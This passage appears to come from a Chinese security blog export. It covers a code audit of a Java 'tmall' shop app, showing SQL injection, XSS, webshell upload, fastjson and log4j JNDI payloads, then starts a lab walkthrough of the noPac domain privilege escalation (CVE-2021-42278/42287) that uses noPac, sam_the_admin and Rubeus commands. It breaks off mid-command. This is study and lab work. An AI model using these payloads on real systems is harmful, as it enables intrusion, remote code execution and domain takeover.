是通过空格去匹配来切割product_name传入的参数的值来分隔的</p>\n<p><strong>.split</strong>：可以根据匹配给定的正则表达式来拆分字符串</p>\n<p>所以传入的参数需要传入两个，并且使用空格分隔。最终得到的payload</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">/tmall/product/0/20?orderBy=%31%20%41%4e%44%20%28%73%65%6c%65%63%74%20%31%20%66%72%6f%6d%20%28%73%65%6c%65%63%74%20%28%73%6c%65%65%70%28%35%29%29%29%6d%73%63%70%29&amp;isDesc=true&amp;category_id=2&amp;category_id=3&amp;product_name=%71%77%65%2c%61%73%64%20%7a%78%63</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">/tmall/product/0/20?orderBy=1 AND (select 1 from (select (sleep(5)))mscp)&amp;isDesc=true&amp;category_id=2&amp;category_id=3&amp;product_name=qwe,asd zxc</span><br></pre></td></tr></table></figure>\n<p><img src=\"S5Yz-EHBh8WNg554WYGuoUzqyYWGPaUN7DBpnf9Xqlc.png\" alt=\"image\"></p>\n<h4 id=\"SQL注入总结\"><a href=\"#SQL注入总结\" class=\"headerlink\" title=\"SQL注入总结\"></a>SQL注入总结</h4><p>本系统共审计发现6个SQL注入点且均已验证确认。下面是详细的污点传播链。</p>\n<ul>\n<li>SQL注入1：<br>RewardController(97)–&gt;RewardService.getList–&gt;RewardMapper.select –&gt;RewardMapper.xml(${orderUtil.orderBy})</li>\n<li>SQL注入2：<br>  ForeProductListController(163)–&gt; ProductService.getMoreList–&gt;ProductMapper.selectMoreList–&gt;  ProductMapper.xml(${orderUtil.orderBy})</li>\n<li>SQL注入3：<br>ProductController(405)–&gt;ProductService.getList–&gt; ProductMapper.select–&gt;  ProductMapper.xml(${orderUtil.orderBy})</li>\n<li>SQL注入4：<br>ForeProductListController(168)–&gt;ProductService.getList–&gt; ProductMapper.select–&gt;ProductMapper.xml(${orderUtil.orderBy})</li>\n<li>SQL注入5：<br>OrderController(176)–&gt;ProductOrderService.getList–&gt;ProductOrderMapper.select–&gt;ProductOrderService.xml(${orderUtil.orderBy})</li>\n<li>SQL注入6：<br>UserController(170)–&gt; UserService.getList–&gt;UserMapper.select–&gt;UserMapper.xml(${orderUtil.orderBy})</li>\n</ul>\n<p><img src=\"34NeD_tT0kwQbDrFJRE_QOjITFE0pW5d9lUxJk46GdY.png\" alt=\"image\"></p>\n<h3 id=\"XSS-反射\"><a href=\"#XSS-反射\" class=\"headerlink\" title=\"XSS(反射)\"></a>XSS(反射)</h3><ul>\n<li>requestScope：是EL表达式中的一个隐含对象，类似request，如：${requestScope.username} 表示在request域中取得username属性所对应的值</li>\n</ul>\n<p>搜索requestScope、map.put。</p>\n<p>触发链：ForeProductListController拿到了product_name后赋值给searchValue，未做处理之后直接map.put传到了request域，转到fore&#x2F;productListPage。</p>\n<p>链为：前端传参–&gt;ForeProductListController–&gt;获取参数–&gt;传到前端–&gt;展示（触发）</p>\n<p><img src=\"l2l6pMOC1jtn27Xp40uLZxt78j7BHP2Np46Kt31_6bA.png\" alt=\"image\"></p>\n<p>productListPage页面直接调用</p>\n<p><img src=\"XKRQ5fGyAcQ6Oyn6prR1mFeqgc7rg_efCoqkIpoAtVk.png\" alt=\"image\"></p>\n<p>验证</p>\n<p><img src=\"2h3pLjkdR6tzagmMau4Pkb9iIpI1gv7-dHFXlpnKN4s.png\" alt=\"image\"></p>\n<p><img src=\"RIWBAYLT2bE54OXw3PovYEUck53NunG-qcPDtzo6nAU.png\" alt=\"image\"></p>\n<h3 id=\"XSS（存储）\"><a href=\"#XSS（存储）\" class=\"headerlink\" title=\"XSS（存储）\"></a>XSS（存储）</h3><p>注册账号</p>\n<p>控制层拿到传入的user_name</p>\n<p><img src=\"NKIT6LiKZqM12dhte7k7ROSZXik3QcKOPqqlS4pl-z4.png\" alt=\"image\"></p>\n<p>创建用户对象，然后将用户对象传入到service层</p>\n<p><img src=\"oa6gt_8VHLNP-34_WdjujK0C2k9aoggYOy4U30bbUQU.png\" alt=\"image\"></p>\n<p>service调用dao层的接口</p>\n<p><img src=\"GOusN-7mvd-I0Ieeq2K72oFuq4IQdFLjrBhowtCD8Wo.png\" alt=\"image\"></p>\n<p><img src=\"ZA_N5lFepeyPq3aMnxLlfnB9ME77u-zBs9lJ9MhR1_c.png\" alt=\"image\"></p>\n<p>最终到了xml配置文件，执行SQL语句的地方，成功插入数据。</p>\n<p><img src=\"7xInJKQWGyGNz4JZenh61qxTRa2wAJZcfHpzHO2j_M0.png\" alt=\"image\"></p>\n<p>burp验证。</p>\n<p><img src=\"Zpu9O9AW14VXKYEx7BzYkQDW5-xwY3PYBZyDk4wYp5s.png\" alt=\"image\"></p>\n<p>看了下数据表，只要名字的长度不超过25就不会报错，不然报服务器500的错误。</p>\n<p><img src=\"Uih_0Rrw4zcFt1tR6nHq-cNJ5EnpoV7lvz3rwcs2R8Q.png\" alt=\"image\"></p>\n<p>登录账号之后触发。有一个页面是去获取数据库中存储的用户名的。所以登录之后直接出发XSS。</p>\n<p><img src=\"URvs16uQc_xgZ63ndFX3e_dWHCTLUd6Ako53blYkBJw.png\" alt=\"image\"></p>\n<p>触发链：</p>\n<p>访问tmall&#x2F;login，即可访问到ForeLoginController控制层的login，重定向到 fore&#x2F;loginPage</p>\n<p><img src=\"b4ufrbzQy2x1NNy3RjihfaBjnrIq7nFLYyWvq-bMoaQ.png\" alt=\"image\"></p>\n<p>登录页面的loginPage.jsp</p>\n<p><img src=\"Zoz2dHy4yuIJqg7zDzSdPSa282T6zWwUpYWbK8d6nqI.png\" alt=\"image\"></p>\n<p>调用了fore_login.js；如果后端响应返回成功，则访问&#x2F;tmall</p>\n<p><img src=\"7xY6hv2tiXTz0c0gGRYRa_W9rQZNGeecvgduRWflQU0.png\" alt=\"image\"></p>\n<p>登录成功返回</p>\n<p><img src=\"1rLYOoBiy_GcuM6mYL5R-Il8_O-bLqZDmTQJ8DakTPE.png\" alt=\"image\"></p>\n<p>主页，取出前面登录成功存进去的userId，判断用户是否登录。如果已经登录则把整改user对象传到Request。map.put(“user”, user)；其中user对象的数据会调用service层的userService.get，service会调用dao的userMapper.selectOne，selectOne去数据库根据这个userId查询信息。返回后封装成User对象。</p>\n<p><img src=\"0HfOGkNMdZwCSNwAIPyYOkjrtm4I-V9v9_Qh1X59M9A.png\" alt=\"image\"></p>\n<p>执行完上面的之后，跳转到fore&#x2F;homePage；homePage里面又包含了navigator.jsp</p>\n<p><img src=\"_16A5IdHxBc5eMux8NY-ORAkXOKUFKpPN0kulPfqTF0.png\" alt=\"image\"></p>\n<p>navigator.jsp触发</p>\n<p><img src=\"3TSQXgEcJ9Y56MH6f9rwmdLFzuBqf9_n_OLr_vL0gFo.png\" alt=\"image\"></p>\n<h3 id=\"文件上传\"><a href=\"#文件上传\" class=\"headerlink\" title=\"文件上传\"></a>文件上传</h3><h4 id=\"文件上传1\"><a href=\"#文件上传1\" class=\"headerlink\" title=\"文件上传1\"></a>文件上传1</h4><p>全局搜索upload</p>\n<p><img src=\"5jCZfY_15FLJfaHu_nYLsj3Fs4II2jM7wEaQdG7F1uc.png\" alt=\"image\"></p>\n<p>发现头像上传的controller，且不存在过滤。</p>\n<p>通过post上传文件，调用UUID随机数重命名文件之后直接保存到了res&#x2F;images&#x2F;item&#x2F;userProfilePicture&#x2F;目录，上传成功之后JSON格式返回状态以及文件名称。</p>\n<p>未对所上传的文件进行类型已经文件后缀校验，存在任意文件上传漏洞。</p>\n<p><img src=\"FEO_t3JVm1MSKbCCnAEVqHkXug_dZSXRM19zKwq4p2Q.png\" alt=\"image\"></p>\n<p>前台用户头像更换处</p>\n<p><img src=\"gtuL_Fd7R3Y9UBVUQfUQ95qZ8Mxwop9L8wsna-vRXFw.png\" alt=\"image\"></p>\n<p>使用蚁剑生成一个jsp的webshell，直接粘贴到bp进行上传。</p>\n<p><img src=\"zyqZl6Hpyqp_kKx0ucpJOI0vMhl3DY3Afjm-UQYdnwU.png\" alt=\"image\"></p>\n<p>连接URL：<a href=\"http://192.168.75.154:8090/tmall/res/images/item/userProfilePicture/e1dd8f9e-25bb-4d14-be97-0f378c49cdf9.jsp\">http://192.168.75.154:8090/tmall/res/images/item/userProfilePicture/e1dd8f9e-25bb-4d14-be97-0f378c49cdf9.jsp</a></p>\n<p>因为有个统一的前缀&#x2F;tmall，所以这个别忘记加上。</p>\n<p><img src=\"yVEiAhYiisiCH01WYjOZrZ2E1s-nrtg5PF5OE-TB5cU.png\" alt=\"image\"></p>\n<p><img src=\"7_XtDcER1-ZWdDXck5QA6j8INlOkYqetQ1HyoaY0m0E.png\" alt=\"image\"></p>\n<p>本项目存在4个文件上传点，且都可以进行getshell</p>\n<h4 id=\"文件上传2\"><a href=\"#文件上传2\" class=\"headerlink\" title=\"文件上传2\"></a>文件上传2</h4><p><img src=\"xZXCYI_skzpX3QvocLJBXgFYyF3hRuQbH98Y9jn5V0Y.png\" alt=\"image\"></p>\n<p><img src=\"4ZofkFAmvbWezVylXq4xRNNmv_Y22Vxb-u86IPZj2tQ.png\" alt=\"image\"></p>\n<p><img src=\"ZS3wfYz4GyRSD9nyWHgc-yOm4LpK4UFIHXEgLWfL5-U.png\" alt=\"image\"></p>\n<p><img src=\"rkTgEsjpNY2ExjI9SODeeVdhLa8F0p3dMRVvL8wfXjc.png\" alt=\"image\"></p>\n<h4 id=\"文件上传3\"><a href=\"#文件上传3\" class=\"headerlink\" title=\"文件上传3\"></a>文件上传3</h4><p>管理员头像上传</p>\n<p><img src=\"AQOXXqxaeV20vD5v1eEZpqRfTeityFJpqsV_H0uJS3U.png\" alt=\"image\"></p>\n<h4 id=\"文件上传4\"><a href=\"#文件上传4\" class=\"headerlink\" title=\"文件上传4\"></a>文件上传4</h4><p>添加产品处</p>\n<p><img src=\"g9BcswcLx3jFva0uCDLFfA1xwyuIRtd6fYdJhiwKAdk.png\" alt=\"image\"></p>\n<p><img src=\"_1a6Wed9yFY01DSimi-fbRq6NJQAQibnsuldmak_7oM.png\" alt=\"image\"></p>\n<h3 id=\"CSRF\"><a href=\"#CSRF\" class=\"headerlink\" title=\"CSRF\"></a>CSRF</h3><p>因项目没有其他过滤器校验Referer头，所以全局存在CSRF漏洞。</p>\n<p><img src=\"fyPyjMeHGyB3foieSIReNHa1W9KCNJXxT-daiXnhVjM.png\" alt=\"image\"></p>\n<p>验证</p>\n<p><img src=\"eXXiTbZ9W-O0Wh2kDRWgePYpPdhMgTU8FyJTi-SoAOE.png\" alt=\"image\"></p>\n<p><img src=\"EBdNXwilm1WtChdps91ukf0QHViF8COp_7BXj7bTpwY.png\" alt=\"image\"></p>\n<h3 id=\"SSRF\"><a href=\"#SSRF\" class=\"headerlink\" title=\"SSRF\"></a>SSRF</h3><p>搜索全局未发现可能引起SSRF的危险函数。</p>\n<h2 id=\"框架漏洞\"><a href=\"#框架漏洞\" class=\"headerlink\" title=\"框架漏洞\"></a>框架漏洞</h2><h3 id=\"fastjson\"><a href=\"#fastjson\" class=\"headerlink\" title=\"fastjson\"></a>fastjson</h3><p>拿到源码的时候，fastjson使用的是1.2.83版本；这个版本目前暂时安全。为了好玩一点，我们可以把版本降低一点来进行fastjson的反序列化攻击测试，我这里就直接改为了1.2.24。（当然这不算属于这个源码本身的漏洞，只是学习把版本降低进行测试。）</p>\n<p>搜索关键字JSON.parseObject（Json字符串转化为相应的对象）</p>\n<p><img src=\"suZ-Aty_CIAkbjBfk-Pj7-Ao2efd0RltOmKtrS98bkU.png\" alt=\"image\"></p>\n<p>更新产品属性的地方进行了JSON.parseObject（添加产品属性的地方也进行了JSON.parseObject）,没进行过滤，从前端获取到数据，直接传给JSON.parseObject。</p>\n<p><img src=\"uBjFPdMakVMEl9o-pAJ2ULEXEAdjCOkhASHx0FgChZ4.png\" alt=\"image\"></p>\n<p><img src=\"jZqZfxwvhLu7UKS8txMiIGs3MrBdqaXPDPQc-VPAOFE.png\" alt=\"image\"></p>\n<p><img src=\"yw8P6P4QKiSBqlSx-MN6j2i7lNxA9iNjZvbiZ3QKudY.png\" alt=\"image\"></p>\n<p>进行dnslog探测</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;garck3h&quot;</span><span class=\"punctuation\">:</span><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;@type&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;java.net.Inet4Address&quot;</span><span class=\"punctuation\">,</span><span class=\"attr\">&quot;val&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;666.eyle20.dnslog.cn&quot;</span><span class=\"punctuation\">&#125;</span><span class=\"punctuation\">&#125;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"bYxVeXTjTX5cbZCkonJGRrfsx0aaAkTDcOvCTH7q3W4.png\" alt=\"image\"></p>\n<p><img src=\"dh6UpVpgr4kuOPU_LT9OgRDSZuV-cd8KSnaAZdjn8TU.png\" alt=\"image\"></p>\n<p>使用BCEL进行本地序列化成功弹计算器。</p>\n<p><img src=\"f8WcV8-fjogKnEk4fjhBaV3kpGhxfPYQeSo8-o1j2Mc.png\" alt=\"image\"></p>\n<p>使用Spring做回显，成功执行命令并且回显</p>\n<p><img src=\"CWCpnsfSkPTl3QqcCuOSNNnGg52aciyLi9y5UZVvGN0.png\" alt=\"image\"></p>\n<p>此外该系统还有其他功能点存在该漏洞</p>\n<h3 id=\"log4j2\"><a href=\"#log4j2\" class=\"headerlink\" title=\"log4j2\"></a>log4j2</h3><p>这里的log4j是2.20版本，属于安全版本。我改一下为2.14版本。测试一下log4j漏洞。</p>\n<p><img src=\"lAcfIK-Ol9vPNWWft8Y6JMJclVva5BZ7aGbYpNIF1p0.png\" alt=\"image\"></p>\n<p>全局搜索：logger.info；发现一个orderBy是可控的</p>\n<p><img src=\"M15QiIJCXqhwFSx95jCZ2-MAEybA7RHhxOs6lgXOW9E.png\" alt=\"image\"></p>\n<p><img src=\"Mo_LiEFaWsRyArUngTNoln12ZkF7YFHYEC6MqQnULn8.png\" alt=\"image\"></p>\n<p>使用dnslog进行探测，成功接收到请求。</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">$<span class=\"punctuation\">&#123;</span>jndi<span class=\"punctuation\">:</span>ldap<span class=\"punctuation\">:</span><span class=\"comment\">//log4j.15k855.dnslog.cn&#125;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"oMwirlis5rJehQMpkWYkxgGXtL1DQ3xt7a5VYckIJ_Q.png\" alt=\"image\"></p>\n<p><img src=\"p4H9naK8RBGr9E6NMItnUf3tviG3yQma81LE7Ba4zuw.png\" alt=\"image\"></p>\n<p>进行JNDI注入：</p>\n<p>写好的弹计算器的payload，然后使用Javac TestCmd.java进行编译</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.io.IOException;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">TestCmd</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">static</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            Runtime.getRuntime().exec(<span class=\"string\">&quot;open /System/Applications/Calculator.app&quot;</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (IOException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">   <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">       <span class=\"type\">TestCmd</span> <span class=\"variable\">qwe</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">TestCmd</span>();</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>使用marshalsec-0.0.3-SNAPSHOT-all.jar起ldap服务</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">java -<span class=\"built_in\">cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <span class=\"string\">&quot;http://127.0.0.1:8888/#TestCmd&quot;</span></span><br></pre></td></tr></table></figure>\n<p>使用python3起http服务</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">python3 -m http.server 8888</span><br></pre></td></tr></table></figure>\n<p>payload</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$&#123;jndi:ldap://192.168.75.154:1389/a&#125;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"UW1eunoi1rK7JLYjRF1XDxEWG5eWa23k0cbZviLPtKE.png\" alt=\"image\"></p>\n<p>此外该系统还有其他功能点存在该漏洞</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><ul>\n<li>因为本次的mysql是部署在Linux服务器的，Linux区分大小写，但SQL文件里面的一些表名称是小写的，会导致表名不对，根据控制台提示进行修改即可。</li>\n<li>遇到错误“this is incompatible with sql_mode&#x3D;only_full_group_by ”；因为mysql 5.7.5版本以上默认的sql配置是:sql_mode&#x3D;“ONLY_FULL_GROUP_BY”。由于开启了ONLY_FULL_GROUP_BY的设置，如果select 的字段不在 group by 中，并且select 的字段未使用聚合函数（SUM,AVG,MAX,MIN等）的话，那么这条sql查询是被mysql认为非法的，会报错误。</li>\n<li>这项目不复杂，都是一些比较常规常见的漏洞，而且调用关系也清晰，审计起来比较轻松。该系统或还有一些没有挖掘的漏洞，望师傅们勿喷。</li>\n</ul>\n","categories":["代码审计"],"tags":["Java安全","代码审计"]},{"title":"Windows域服务权限提升（CVE-2021-42287）","url":"/2022/04/07/Windows%E5%9F%9F%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%EF%BC%88CVE-2021-42287%EF%BC%89/","content":"<h1 id=\"Windows域服务权限提升（CVE-2021-42287）\"><a href=\"#Windows域服务权限提升（CVE-2021-42287）\" class=\"headerlink\" title=\"Windows域服务权限提升（CVE-2021-42287）\"></a>Windows域服务权限提升（CVE-2021-42287）</h1><h2 id=\"漏洞原理\"><a href=\"#漏洞原理\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h2><p>Microsoft Windows Active Directory 域服务权限提升漏洞（CVE-2021-42278、CVE-2021-42287）攻击者可利用该漏洞将域内的普通用户权限提升到域管理员权限，造成风险和危害极大。</p>\n<h2 id=\"靶场环境：\"><a href=\"#靶场环境：\" class=\"headerlink\" title=\"靶场环境：\"></a>靶场环境：</h2><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\">域：fbi.gov</span><br><span class=\"line\">域控：dc.fbi.gov</span><br><span class=\"line\">普通域用户：fbi\\fileserver</span><br></pre></td></tr></table></figure>\n<p>影响范围</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">CVE-2021-42278</span><br><span class=\"line\">￮ Windows Server 2012 R2</span><br><span class=\"line\">￮ Windows Server 2012 (Server Core installation)</span><br><span class=\"line\">￮ Windows Server 2012</span><br><span class=\"line\">￮ Windows Server 2008 R2 for x64-based Systems Service Pack 1(Server Core installation)</span><br><span class=\"line\">￮ Windows Server 2008 R2 for x64-based Systems Service Pack 1</span><br><span class=\"line\">￮ Windows Server 2008 for x64-based Systems Service Pack 2(Server Core installation)</span><br><span class=\"line\">￮ Windows Server 2008 for x64-based Systems Service Pack 2</span><br><span class=\"line\">￮ Windows Server 2008 for 32-bit Systems Service Pack 2(Server Core installation)</span><br><span class=\"line\">￮ Windows Server 2008 for 32-bit Systems Service Pack 2</span><br><span class=\"line\">￮ Windows Server 2016 (Server Core installation)</span><br><span class=\"line\">￮ Windows Server 2016</span><br><span class=\"line\">￮ Windows Server, version 20H2 (Server Core Installation)</span><br><span class=\"line\">￮ Windows Server, version 2004 (Server Core installation)</span><br><span class=\"line\">￮ Windows Server 2022 (Server Core installation)</span><br><span class=\"line\">￮ Windows Server 2019 (Server Core installation)</span><br><span class=\"line\">￮ Windows Server 2022￮ Windows Server 2019</span><br><span class=\"line\">￮ Windows Server 2012 R2 (Server Core installation)</span><br></pre></td></tr></table></figure>\n<h2 id=\"利用条件\"><a href=\"#利用条件\" class=\"headerlink\" title=\"利用条件\"></a>利用条件</h2><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\">（1）一个普通域成员帐户。</span><br><span class=\"line\">（2）域用户有创建机器用户的权限（一般默认权限）。</span><br><span class=\"line\">（3）DC未打补丁KB5008380或KB5008602。</span><br></pre></td></tr></table></figure>\n\n\n<h2 id=\"直接利用一（noPac-py）\"><a href=\"#直接利用一（noPac-py）\" class=\"headerlink\" title=\"直接利用一（noPac.py）\"></a>直接利用一（noPac.py）</h2><p><a href=\"https://github.com/cube0x0/noPac\">https://github.com/cube0x0/noPac</a></p>\n<p>扫描探测（noPac.py）</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">.\\noPac.exe scan -domain fbi.gov -user fileserver -pass <span class=\"string\">&#x27;QWEasd1234&#x27;</span></span><br></pre></td></tr></table></figure>\n<p>直接利用（noPac.py）</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">.\\noPac.exe -domain fbi.gov -user fileserver -pass <span class=\"string\">&#x27;QWEasd1234&#x27;</span> /dc dc.fbi.gov /mAccount garck /mPassword pass123 /service cifs /ptt</span><br></pre></td></tr></table></figure>\n<p><img src=\"0.8681485612867944.png\" alt=\"image\"></p>\n<p>若用户存在的话，则会显示对象已经存在</p>\n<p><img src=\"62c1fb32-ebb9-4bac-9b4c-a219d2344728.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">ls</span> //dc.fbi.gov/c$</span><br></pre></td></tr></table></figure>\n<p><img src=\"0.8251252992718687.png\" alt=\"image\"></p>\n<p>当服务器xxx时，再攻击DC域控的时候会出现下面的情况</p>\n<p><img src=\"1c7b83a0-48c1-438c-a207-65615554f6d0.png\" alt=\"image\"></p>\n<h2 id=\"直接利用二（sam-the-admin-py）\"><a href=\"#直接利用二（sam-the-admin-py）\" class=\"headerlink\" title=\"直接利用二（sam_the_admin.py）\"></a>直接利用二（sam_the_admin.py）</h2><p><strong>注意⚠️：从域外环境已知域内一个普通用户密码直接拿DC shell或者域内所有hash（IP为访问到）。</strong></p>\n<p><a href=\"https://github.com/WazeHell/sam-the-admin\">https://github.com/WazeHell/sam-the-admin</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">python3 sam_the_admin.py fbi.gov/fileserver:<span class=\"string\">&#x27;QWEasd1234&#x27;</span> -dc-ip 192.168.8.11 -shell</span><br></pre></td></tr></table></figure>\n<p><img src=\"b24fd0cb-ce22-4f8c-9580-fe5dd14907e6.png\" alt=\"image\"></p>\n<p>当服务器xxx时，再攻击DC域控的时候会出现下面的情况</p>\n<p><img src=\"4c59e895-9183-4fb5-a7b9-2d240765b4c8.png\" alt=\"image\"></p>\n<h2 id=\"本地复现\"><a href=\"#本地复现\" class=\"headerlink\" title=\"本地复现\"></a>本地复现</h2><h3 id=\"1、普通域成员账户\"><a href=\"#1、普通域成员账户\" class=\"headerlink\" title=\"1、普通域成员账户\"></a>1、普通域成员账户</h3><figure class=\"highlight plaintext\"><figcaption><span>Text</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">net user fileserver /domain</span><br></pre></td></tr></table></figure>\n<p><img src=\"5d95aa78-e29c-4780-b250-1e630bc93989.png\" alt=\"image\"></p>\n<h3 id=\"2、利用-powermad-ps1-新增机器帐号testspn（域用户默认可以新建机器账户）\"><a href=\"#2、利用-powermad-ps1-新增机器帐号testspn（域用户默认可以新建机器账户）\" class=\"headerlink\" title=\"2、利用 powermad.ps1 新增机器帐号testspn（域用户默认可以新建机器账户）\"></a>2、利用 powermad.ps1 新增机器帐号testspn（域用户默认可以新建机器账户）</h3><p>下载地址：<a href=\"https://github.com/Kevin-Robertson/Powermad\">https://github.com/Kevin-Robertson/Powermad</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Import-Module .\\Powermad.ps1</span><br><span class=\"line\">//若报错执行 Set-ExecutionPolicy Unrestricted</span><br><span class=\"line\">New-MachineAccount -MachineAccount testspn -Domain fbi.gov -DomainController dc.fbi.gov -Verbose</span><br><span class=\"line\">//密码输入123.com</span><br></pre></td></tr></table></figure>\n<p><img src=\"b0f5c505-c050-485c-ae6e-aca22dc7caf6.png\" alt=\"image\"></p>\n<h3 id=\"3、Clear-its-SPNs（利用PowerView清除SPN信息）\"><a href=\"#3、Clear-its-SPNs（利用PowerView清除SPN信息）\" class=\"headerlink\" title=\"3、Clear its SPNs（利用PowerView清除SPN信息）\"></a>3、Clear its SPNs（利用PowerView清除SPN信息）</h3><p>更改执行策略，以管理员身份打开 PowerShell 输入：</p>\n<figure class=\"highlight plaintext\"><figcaption><span>Text</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">&gt;&gt; set-executionpolicy remotesigned</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><figcaption><span>Text</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">如果要更改回Windows 客户端计算机的默认执行策略，则设置为restricted：set-executionpolicy restricted</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">//需要ps1版本impact套件</span><br><span class=\"line\">Import-Module .\\PowerView.ps1</span><br><span class=\"line\">Set-DomainObject <span class=\"string\">&quot;CN=testspn,CN=Computers,DC=fbi,DC=gov&quot;</span> -Clear <span class=\"string\">&#x27;serviceprincipalname&#x27;</span> -Verbose</span><br></pre></td></tr></table></figure>\n<p><img src=\"4dc5ad32-e97f-48ca-94c8-3dd0e1bdbe96.png\" alt=\"image\"></p>\n<h3 id=\"4、Reset-the-computer-name（利用Powermad重设机器名称）\"><a href=\"#4、Reset-the-computer-name（利用Powermad重设机器名称）\" class=\"headerlink\" title=\"4、Reset the computer name（利用Powermad重设机器名称）\"></a>4、Reset the computer name（利用Powermad重设机器名称）</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Set-MachineAccountAttribute -MachineAccount testspn -Value <span class=\"string\">&quot;dc&quot;</span> -Attribute samaccountname -Verbose</span><br><span class=\"line\">//由于当前DC SPN账户为dc$，故要设置为dc进行伪造</span><br></pre></td></tr></table></figure>\n<p><img src=\"564a7c07-f22d-498a-b59a-c9836ba03760.png\" alt=\"image\"></p>\n<h3 id=\"5、Request-TGT-（请求TGT）\"><a href=\"#5、Request-TGT-（请求TGT）\" class=\"headerlink\" title=\"5、Request TGT （请求TGT）\"></a>5、Request TGT （请求TGT）</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">.\\Rubeus.exe asktgt /user:dc /password:123.com /domian:fbi.gov /dc:dc.fbi.gov /nowrap</span><br><span class=\"line\">.\\Rubeus.exe asktgt /user:administrator /password:123.com /domian:fbi.gov /dc:dc.fbi.gov /nowrap</span><br></pre></td></tr></table></figure>\n<p><img src=\"d4f1a458-e3d8-478c-9d83-46fc845961a9.png\" alt=\"image\"></p>\n<h3 id=\"6、Change-Machine-Account-samaccountname（还原初始账户属性）\"><a href=\"#6、Change-Machine-Account-samaccountname（还原初始账户属性）\" class=\"headerlink\" title=\"6、Change Machine Account samaccountname（还原初始账户属性）\"></a>6、Change Machine Account samaccountname（还原初始账户属性）</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">//重新还原机器帐户属性后，现在就可以使用能检索到的TGT请求S4U2self票证来获得使用DC密钥加密的ST，同时还可以将票证中的sname重写为LDAP服务</span><br><span class=\"line\">Set-MachineAccountAttribute -MachineAccount testspn -Value <span class=\"string\">&quot;testspn&quot;</span> -Attribute samaccountname -Verbose</span><br></pre></td></tr></table></figure>\n<p><img src=\"6e958824-068b-45b5-9985-6c3fcd6b299b.png\" alt=\"image\"></p>\n<h3 id=\"7、Request-S4U2self（获取票据）\"><a href=\"#7、Request-S4U2self（获取票据）\" class=\"headerlink\" title=\"7、Request S4U2self（获取票据）\"></a>7、Request S4U2self（获取票据）</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">./Rubeus.exe s4u /impersonateuser:Administrator /nowrap /dc:dc.fbi.gov /self /altservice:LDAP/dc.fbi.gov /ptt 